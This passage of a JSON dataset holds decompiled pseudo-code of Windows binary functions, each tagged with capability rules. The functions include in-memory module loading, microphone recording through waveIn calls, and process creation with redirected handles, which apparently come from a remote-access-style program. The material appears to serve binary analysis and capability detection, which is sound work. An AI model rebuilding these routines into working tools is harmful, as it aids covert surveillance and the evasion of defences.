        "decompiled_code": "\nuint __fastcall fcn.00464d08(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint32_t uVar2;\n    uchar *arg_8h;\n    uint uStack24;\n    uint uStack20;\n    uchar auStack16 [4];\n    \n    if (param_2 < -1) {\n        param_2 = -1;\n    }\n    if ((param_2 == -1) || (*(in_EAX + 0xb) != '\\0')) {\n        fcn.00464238();\n        uVar1 = fcn.004642b4();\n    }\n    else {\n        uVar1 = 0;\n        fcn.00463a9c();\n        arg_8h = auStack16;\n        uVar2 = fcn.00463b78(arg_8h);\n        if ((uVar2 & 0x80000000) == 0) {\n            *(in_EAX + 0xb) = 0;\n            uVar1 = 1;\n            *(in_EAX + 0x18) = arg_8h;\n            *(in_EAX + 0x1c) = uStack24;\n            *(in_EAX + 0x20) = uStack20;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 294
    },
    "00464e3c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00464e3c(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*0x499f44 != 0) && (*(in_EAX + 5) != '\\0')) {\n        fcn.00464238();\n        fcn.00404650();\n        *0x499f44 = 0;\n        *(in_EAX + 5) = 0;\n    }\n    return;\n}\n",
        "token_count": 94
    },
    "00464e70": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00464e70(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x464ee2;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    if (*0x499f44 != 0) {\n        fcn.00409d70();\n        fcn.00405864();\n        cVar1 = fcn.004642b4();\n        if (cVar1 != '\\0') {\n            *(in_EAX + 5) = 1;\n        }\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x464ee9;\n    uStack28 = 0x464ee1;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 230
    },
    "00464efc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.00464efc(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = 0;\n    puStack28 = 0x464f1b;\n    piVar2 = fcn.004293dc();\n    uStack32 = 0x464f83;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    if (*(in_EAX + 5) == '\\0') {\n        puStack28 = &fcn.00464efc::var_1h + 1;\n        fcn.00404f70();\n        return var_1h;\n    }\n    puStack28 = &fcn.00464efc::var_1h + 1;\n    cVar1 = fcn.0046420c();\n    if (cVar1 != '\\0') {\n        var_1h._0_1_ = fcn.00464cf8();\n        (**(*piVar2 + 0x68))();\n        fcn.0045fe8c();\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x464f8a;\n    uStack32 = 0x464f82;\n    uVar3 = fcn.00404650();\n    return uVar3;\n}\n",
        "token_count": 382
    },
    "004653a8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004653a8(int32_t *param_1, uint *param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint uVar7;\n    uint uVar8;\n    uint uVar9;\n    uint uVar10;\n    uint auStack264 [13];\n    int32_t iStack212;\n    \n    puVar4 = auStack264;\n    for (iVar2 = 0x3e; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = *param_2;\n        param_2 = param_2 + 1;\n        puVar4 = puVar4 + 1;\n    }\n    iVar2 = fcn.00465350(*param_1);\n    uVar3 = *(*param_1 + 6);\n    if (-1 < uVar3 - 1) {\n        do {\n            if (*(iVar2 + 0x10) == 0) {\n                if (0 < iStack212) {\n                    uVar9 = 4;\n                    uVar8 = 0x1000;\n                    iVar6 = *(iVar2 + 0xc);\n                    uVar7 = 0;\n                    iVar5 = iStack212;\n                    uVar1 = fcn.004652b4(iVar6, 0);\n                    uVar1 = sub.kernel32.dll_VirtualAlloc_1(uVar1, iVar6, uVar7, iVar5, uVar8, uVar9);\n                    *(iVar6 + 8) = uVar1;\n                    fcn.00403af4();\n                }\n                fcn.00465284(0x28, 0);\n            }\n            else {\n                uVar10 = 4;\n                uVar9 = 0x1000;\n                uVar1 = *(iVar2 + 0x10);\n                iVar6 = *(iVar2 + 0xc);\n                uVar8 = 0;\n                uVar7 = fcn.004652b4(iVar6, 0);\n                uVar1 = sub.kernel32.dll_VirtualAlloc_1(uVar7, iVar6, uVar8, uVar1, uVar9, uVar10);\n                iVar5 = 0;\n                fcn.004652b4(*(iVar6 + 0x14), 0);\n                fcn.00408560();\n                *(iVar5 + 8) = uVar1;\n                fcn.00465284(0x28, 0);\n            }\n            uVar3 = uVar3 - 1;\n        } while (uVar3 != 0);\n    }\n    return;\n}\n",
        "token_count": 602
    },
    "004654ac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004654ac(uint arg_8h, uint arg_ch)\n\n{\n    uint *puVar1;\n    int32_t *piVar2;\n    uint16_t *puVar3;\n    int32_t iVar4;\n    uint32_t arg_8h_00;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    puVar1 = fcn.0046538c();\n    if (puVar1[1] != 0) {\n        piVar2 = fcn.004652b4(*puVar1, 0);\n        while (*piVar2 != 0) {\n            fcn.004652b4(*piVar2, 0);\n            puVar3 = fcn.004652b4(8, 0);\n            iVar4 = fcn.0040345c();\n            do {\n                arg_8h_00 = *puVar3 & 0xfff;\n                if (*puVar3 >> 0xc == 3) {\n                    fcn.004652b4(arg_8h_00, 0);\n                    fcn.00465284(arg_8h_00, 0);\n                }\n                puVar3 = puVar3 + 1;\n                iVar4 = iVar4 + -1;\n            } while (iVar4 != 0);\n            fcn.00465284(piVar2[1], 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 330
    },
    "00465598": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00465598(int32_t arg_8h)\n\n{\n    char cVar1;\n    ushort uVar2;\n    uint *puVar3;\n    uint uVar4;\n    int32_t *piVar5;\n    int32_t *piVar6;\n    int32_t iVar7;\n    int32_t **in_FS_OFFSET;\n    int32_t *in_stack_fffffebc;\n    int32_t *piStack308;\n    uint uStack304;\n    uchar *puStack300;\n    uint var_118h;\n    uint var_112h;\n    int32_t var_10h;\n    int32_t hModule;\n    int32_t *lp;\n    uint var_1h;\n    \n    puStack300 = &var_1h + 1;\n    uStack304 = 0x4657d8;\n    piStack308 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack308;\n    var_1h._0_1_ = 1;\n    puVar3 = fcn.0046538c();\n    if (puVar3[1] != 0) {\n        lp = fcn.004652b4(*puVar3, 0);\n        while( true ) {\n            in_stack_fffffebc = lp;\n            iVar7 = sub.kernel32.dll_IsBadReadPtr(lp, 0x14);\n            if ((iVar7 != 0) || (lp[3] == 0)) goto code_r0x004657bf;\n            fcn.004652b4(lp[3], 0);\n            uVar4 = fcn.00465344();\n            hModule = sub.kernel32.dll_LoadLibraryA(uVar4);\n            if (hModule == -1) break;\n            if (*(arg_8h + 8) == 0) {\n                uVar4 = fcn.00402ee8();\n                *(arg_8h + 8) = uVar4;\n            }\n            uVar4 = fcn.00407160(*(arg_8h + 8), (*(arg_8h + 0xc) + 1) * 4);\n            *(arg_8h + 8) = uVar4;\n            if (*(arg_8h + 8) == 0) {\n                fcn.00405584();\n                var_1h._0_1_ = 0;\n                goto code_r0x004657bf;\n            }\n            var_10h = *(arg_8h + 0xc) * 4;\n            fcn.00465284(var_10h, var_10h >> 0x1f);\n            piVar5 = *(arg_8h + 8);\n            *piVar5 = hModule;\n            piVar5[1] = 0;\n            fcn.0046529c(var_10h, var_10h >> 0x1f);\n            *(arg_8h + 0xc) = *(arg_8h + 0xc) + 1;\n            if (*lp == 0) {\n                piVar5 = fcn.004652b4(lp[4], 0);\n            }\n            else {\n                piVar5 = fcn.004652b4(*lp, 0);\n            }\n            piVar6 = fcn.004652b4(lp[4], 0);\n            for (; *piVar5 != 0; piVar5 = piVar5 + 1) {\n                cVar1 = fcn.0046539c();\n                if (cVar1 == '\\0') {\n                    fcn.004652b4(*piVar5, 0);\n                    fcn.00408560();\n                    iVar7 = sub.kernel32.dll_GetProcAddress_1(hModule, &var_112h + 2);\n                    *piVar6 = iVar7;\n                }\n                else {\n                    uVar2 = fcn.00465394();\n                    iVar7 = sub.kernel32.dll_GetProcAddress_1(hModule, uVar2);\n                    *piVar6 = iVar7;\n                }\n                if (*piVar6 == 0) {\n                    fcn.00405584();\n                    var_1h._0_1_ = 0;\n                    break;\n                }\n                piVar6 = piVar6 + 1;\n            }\n            fcn.00465284(0x14, 0);\n        }\n        fcn.004652b4(lp[3], 0);\n        fcn.00465344();\n        fcn.00405728();\n        fcn.00405864();\n        var_1h._0_1_ = 0;\n    }\ncode_r0x004657bf:\n    *in_FS_OFFSET = in_stack_fffffebc;\n    fcn.00405530(0x4657df);\n    return;\n}\n",
        "token_count": 1068
    },
    "00465df8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00465df8(uint param_1, uint16_t *param_2)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint32_t *puVar3;\n    int32_t iVar4;\n    uint32_t arg_8h;\n    int32_t iVar5;\n    bool bVar6;\n    uint uVar7;\n    \n    puVar1 = fcn.0046538c(param_2, 0, 0xffffffff);\n    if (puVar1[1] == 0) {\n        uVar7 = 0x465e32;\n        fcn.00405584();\n    }\n    else {\n        uVar7 = 0;\n        iVar2 = fcn.004652b4(*puVar1, 0);\n        if ((*(iVar2 + 0x18) == 0) || (*(iVar2 + 0x14) == 0)) {\n            fcn.00405584();\n        }\n        else {\n            puVar3 = fcn.004652f8();\n            fcn.004652f8();\n            iVar5 = *(iVar2 + 0x18);\n            do {\n                arg_8h = *puVar3;\n                fcn.004652b4(arg_8h, 0);\n                fcn.00465344();\n                iVar4 = fcn.0040a970();\n                if (iVar4 == 0) {\n                    arg_8h = *param_2;\n                    break;\n                }\n                puVar3 = puVar3 + 1;\n                param_2 = param_2 + 1;\n                iVar5 = iVar5 + -1;\n            } while (iVar5 != 0);\n            if (param_2 == 0xffffffff) {\n                fcn.00405584(arg_8h);\n            }\n            else {\n                bVar6 = param_2 < 0;\n                if (-1 < param_2) {\n                    bVar6 = *(iVar2 + 0x14) + -1 < param_2;\n                }\n                if (bVar6) {\n                    fcn.00405584(arg_8h);\n                }\n                else {\n                    fcn.004652b4(param_2 * 4, param_2 * 4 >> 0x1f);\n                    puVar1 = fcn.004652f8();\n                    fcn.004652b4(*puVar1, puVar1[1]);\n                }\n            }\n        }\n    }\n    return uVar7;\n}\n",
        "token_count": 547
    },
    "00466038": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00466038(void)\n\n{\n    int32_t *in_EAX;\n    code *pcVar1;\n    int32_t iVar2;\n    bool bVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint uVar6;\n    uint extraout_var;\n    \n    if ((in_EAX != NULL) && (*(in_EAX + 4) != '\\0')) {\n        uVar4 = *(*in_EAX + 0x28);\n        uVar6 = 0;\n        pcVar1 = fcn.004652b4(uVar4, 0);\n        (*pcVar1)(in_EAX[1], 0, 0, uVar4, uVar6, extraout_var);\n        *(in_EAX + 4) = 0;\n        iVar2 = in_EAX[3];\n        if (-1 < iVar2 + -1) {\n            iVar5 = 0;\n            do {\n                iVar5 = iVar5 * 4;\n                uVar4 = 0x466096;\n                fcn.00465284(iVar5, iVar5 >> 0x1f);\n                bVar3 = in_EAX[2][1] == 0;\n                if (bVar3) {\n                    bVar3 = *in_EAX[2] == -1;\n                }\n                if (!bVar3) {\n                    sub.kernel32.dll_FreeLibrary_1(uVar4);\n                }\n                fcn.0046529c(iVar5, iVar5 >> 0x1f);\n                iVar5 = iVar5 + 1;\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        fcn.00407148(in_EAX[2]);\n        if (in_EAX[1] != 0) {\n            sub.kernel32.dll_VirtualFree_1(in_EAX[1], 0, 0x8000);\n        }\n        uVar4 = sub.kernel32.dll_GetProcessHeap(0);\n        sub.kernel32.dll_HeapFree(uVar4);\n    }\n    return;\n}\n",
        "token_count": 453
    },
    "00466470": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00466470(void)\n\n{\n    int32_t in_EAX;\n    \n    fcn.00403af4();\n    sub.msacm32.dll_acmStreamConvert(*(in_EAX + 0x104), in_EAX + 0x108, 4);\n    sub.msacm32.dll_acmStreamReset(*(in_EAX + 0x104), 0);\n    *(in_EAX + 0x100) = 0;\n    return *(in_EAX + 300);\n}\n",
        "token_count": 112
    },
    "00466740": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00466740(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0xec) == '\\0') {\n        *(in_EAX + 0xf8) = param_2;\n    }\n    return;\n}\n",
        "token_count": 68
    },
    "004667dc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.004667dc(uint arg_8h, uint arg_ch)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    uchar *puVar3;\n    uchar *puVar4;\n    \n    puVar1 = *0x499f50;\n    if (*0x499f54 == NULL) {\n        puVar1 = sub.kernel32.dll_VirtualAlloc_1(0, 0x1000, 0x1000, 0x40);\n        *puVar1 = *0x499f50;\n        fcn.004030fc();\n        uVar2 = fcn.004667d4();\n        *(puVar1 + 6) = uVar2;\n        puVar3 = puVar1 + 10;\n        do {\n            puVar4 = puVar3;\n            *puVar4 = 0xe8;\n            uVar2 = fcn.004667d4();\n            *(puVar4 + 1) = uVar2;\n            *(puVar4 + 5) = *0x499f54;\n            puVar3 = puVar4 + 0xd;\n            *0x499f54 = puVar4;\n        } while ((puVar4 + 0xd) - puVar1 < 0xffc);\n    }\n    *0x499f50 = puVar1;\n    puVar3 = *0x499f54;\n    puVar1 = *0x499f54 + 5;\n    *0x499f54 = *(*0x499f54 + 5);\n    *puVar1 = arg_8h;\n    *(puVar3 + 9) = arg_ch;\n    return puVar3;\n}\n",
        "token_count": 372
    },
    "00466888": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00466888(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    uint lpWndClass;\n    code *var_24h;\n    \n    *0x492ad8 = *0x4977f8;\n    iVar1 = sub.user32.dll_GetClassInfoA(*0x4977f8, *0x492aec, &lpWndClass);\n    if ((iVar1 == 0) || (var_24h != sub.user32.dll_DefWindowProcA)) {\n        if (iVar1 != 0) {\n            sub.user32.dll_UnregisterClassA(*0x492aec, *0x4977f8);\n        }\n        sub.user32.dll_RegisterClassA(0x492ac8);\n    }\n    uVar2 = fcn.0040857c(0, *0x4977f8, 0, 0, 0, 0, 0, 0, 0x80000000);\n    if (arg_8h._2_2_ != 0) {\n        uVar3 = fcn.004667dc(arg_8h, arg_ch);\n        sub.user32.dll_SetWindowLongA(uVar2, 0xfffffffc, uVar3);\n    }\n    return uVar2;\n}\n",
        "token_count": 295
    },
    "004669d4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004669d4(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack44;\n    int32_t iStack40;\n    uchar *puStack36;\n    uint uStack32;\n    int32_t iStack28;\n    uint uStack24;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(in_EAX + 4) == '\\0') {\n        uStack24 = 0x466af5;\n        fcn.00466ca8();\n    }\n    else {\n        uStack24 = 0x20;\n        uStack32 = *(in_EAX + 0x94);\n        puStack36 = 0x466a03;\n        iStack28 = param_2;\n        iVar1 = sub.winmm.dll_waveInUnprepareHeader();\n        if (iVar1 == 0) {\n            uVar2 = *(param_2 + 8);\n            if (*(in_EAX + 0xa2) != 0) {\n                puStack36 = 0x466a25;\n                fcn.00402f00();\n                iStack40 = 0x466a71;\n                uStack44 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffd4;\n                puStack36 = &stack0xfffffffc;\n                fcn.004030fc();\n                (**(in_EAX + 0xa0))();\n                *in_FS_OFFSET = uVar2;\n                iStack40 = 0x466a78;\n                uStack44 = 0x466a70;\n                fcn.00402f1c();\n                return;\n            }\n            *(param_2 + 4) = *(in_EAX + 0xc);\n            *(param_2 + 8) = 0;\n            *(param_2 + 0xc) = 0;\n            *(param_2 + 0x10) = 0;\n            *(param_2 + 0x14) = 0;\n            puStack36 = 0x466ab6;\n            fcn.00408568();\n            puStack36 = 0x20;\n            uStack44 = *(in_EAX + 0x94);\n            iStack40 = param_2;\n            iVar1 = sub.winmm.dll_waveInPrepareHeader();\n            if (iVar1 == 0) {\n                sub.winmm.dll_waveInAddBuffer(*(in_EAX + 0x94), param_2, 0x20);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 582
    },
    "00466afc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00466afc(uint param_1, uint *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint *puVar4;\n    int32_t aiStack172 [3];\n    uchar *puStack160;\n    uint uStack156;\n    uint uStack152;\n    uint uStack148;\n    uint auStack144 [33];\n    \n    puVar3 = &stack0xffffff70;\n    for (iVar1 = 0x20; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = *param_2;\n        param_2 = param_2 + 1;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = *param_2;\n    if (*(in_EAX + 4) == '\\0') {\n        uStack148 = 0x10004;\n        uStack152 = 0;\n        uStack156 = *(in_EAX + 0x98);\n        puStack160 = &stack0xffffff70;\n        aiStack172[2] = 0;\n        aiStack172[1] = in_EAX + 0x94;\n        aiStack172[0] = 0x466b3b;\n        iVar1 = sub.winmm.dll_waveInOpen();\n        if (iVar1 == 0) {\n            for (uVar2 = *(in_EAX + 0x91); uVar2 != 0; uVar2 = uVar2 - 1) {\n                aiStack172[0] = 0x466b51;\n                fcn.00466c40();\n            }\n            aiStack172[0] = *(in_EAX + 0x94);\n            iVar1 = sub.winmm.dll_waveInStart();\n            if (iVar1 == 0) {\n                puVar3 = &stack0xffffff54;\n                puVar4 = in_EAX + 0x10;\n                for (iVar1 = 0x20; iVar1 != 0; iVar1 = iVar1 + -1) {\n                    *puVar4 = *puVar3;\n                    puVar3 = puVar3 + 1;\n                    puVar4 = puVar4 + 1;\n                }\n                *puVar4 = *puVar3;\n                *(in_EAX + 4) = 1;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 540
    },
    "00466bdc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00466bdc(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (*(in_EAX + 4) != '\\0') {\n        *(in_EAX + 4) = 0;\n        sub.winmm.dll_waveInReset(*(in_EAX + 0x94));\n        sub.winmm.dll_waveInClose(*(in_EAX + 0x94));\n        *(in_EAX + 0x94) = 0;\n        iVar1 = *(*(in_EAX + 8) + 8) + -1;\n        if (-1 < iVar1) {\n            do {\n                fcn.0046626c();\n                fcn.00466ca8();\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != -1);\n        }\n    }\n    return;\n}\n",
        "token_count": 186
    },
    "00466c34": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00466c34(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 4) == '\\0') {\n        *(in_EAX + 0xc) = param_2;\n    }\n    return;\n}\n",
        "token_count": 67
    },
    "00466d4c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.00466d4c(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack928;\n    uint uStack924;\n    uchar *puStack920;\n    uint lpSecurityAttributes;\n    uint var_380h;\n    uint var_37ch;\n    int32_t hHandle;\n    int32_t var_374h;\n    uint var_368h;\n    uint var_33ch;\n    uint var_338h;\n    int32_t var_330h;\n    int32_t var_32ch;\n    uint var_323h;\n    uint lpFileName;\n    uint var_119h;\n    int32_t hObject;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    puStack920 = 0x466d65;\n    cVar1 = fcn.0040a26c();\n    if (cVar1 == '\\0') {\n        var_1h._0_1_ = 0;\n    }\n    else {\n        puStack920 = 0x466d7f;\n        fcn.0040a928();\n        puStack920 = 0x466d8c;\n        fcn.0040a928();\n        puStack920 = 0x466d99;\n        fcn.0040a928();\n        uStack924 = 0x466f3b;\n        iStack928 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xfffffc60;\n        puStack920 = &fcn.00466d4c::var_1h + 1;\n        fcn.00403af4();\n        lpSecurityAttributes = 0xc;\n        var_380h = 0;\n        var_37ch = 0xffffffff;\n        var_10h = sub.kernel32.dll_CreateFileA_1\n                            (&fcn.00466d4c::lpFileName, 0xc0000000, 3, &fcn.00466d4c::lpSecurityAttributes, 4, 0x100, 0)\n        ;\n        if (var_10h == -1) {\n            var_1h._0_1_ = 0;\n            fcn.00404f70();\n        }\n        else {\n            hObject = sub.kernel32.dll_CreateFileA_1\n                                (&fcn.00466d4c::var_323h, 0xc0000000, 3, &fcn.00466d4c::lpSecurityAttributes, 2, 0x100, \n                                 0);\n            if (hObject == -1) {\n                var_1h._0_1_ = 0;\n                fcn.00404f70();\n            }\n            else {\n                fcn.00403af4();\n                var_368h = 0x44;\n                var_33ch = 0x101;\n                var_338h._0_2_ = 0;\n                var_32ch = hObject;\n                var_330h = var_10h;\n                iVar2 = sub.kernel32.dll_CreateProcessA\n                                  (0, &fcn.00466d4c::var_119h, 0, 0, 0xffffffff, 0x110, 0, 0, &fcn.00466d4c::var_368h, \n                                   &fcn.00466d4c::hHandle);\n                var_1h._0_1_ = '\\x01' - (iVar2 == 0);\n                if (var_1h != '\\0') {\n                    iVar2 = hHandle;\n                    sub.kernel32.dll_WaitForSingleObject(hHandle, 0xffffffff);\n                    var_8h = hHandle;\n                    var_ch = var_374h;\n                    uVar3 = 0;\n                    *in_FS_OFFSET = iVar2;\n                    if (hObject != 0) {\n                        uVar3 = sub.kernel32.dll_CloseHandle_1(hObject, 0x466f42);\n                    }\n                    if (var_10h != 0) {\n                        uVar3 = sub.kernel32.dll_CloseHandle_1(var_10h);\n                    }\n                    if (var_ch != 0) {\n                        uVar3 = sub.kernel32.dll_CloseHandle_1(var_ch);\n                    }\n                    if (var_8h != 0) {\n                        uVar3 = sub.kernel32.dll_CloseHandle_1(var_8h);\n                    }\n                    return uVar3;\n                }\n                var_1h._0_1_ = 0;\n                fcn.00404f70();\n            }\n        }\n    }\n    return var_1h;\n}\n",
        "token_count": 1056
    },
    "00466fec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_40h\n// WARNING: Variable defined which should be unmapped: var_3ch\n// WARNING: Variable defined which should be unmapped: var_48h\n// WARNING: Variable defined which should be unmapped: var_44h\n// WARNING: Variable defined which should be unmapped: var_54h\n// WARNING: Variable defined which should be unmapped: var_50h\n// WARNING: Variable defined which should be unmapped: var_5ch\n// WARNING: Variable defined which should be unmapped: var_58h\n// WARNING: Variable defined which should be unmapped: var_64h\n// WARNING: Variable defined which should be unmapped: var_60h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid __fastcall fcn.00466fec(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint unaff_EBX;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint *in_FS_OFFSET;\n    uchar *var_68h;\n    uint *var_64h;\n    uint32_t var_60h;\n    uint *var_5ch;\n    uint *var_58h;\n    uint *var_54h;\n    uint *var_50h;\n    uint *var_4ch;\n    uint *var_48h;\n    uint32_t var_44h;\n    uint *var_40h;\n    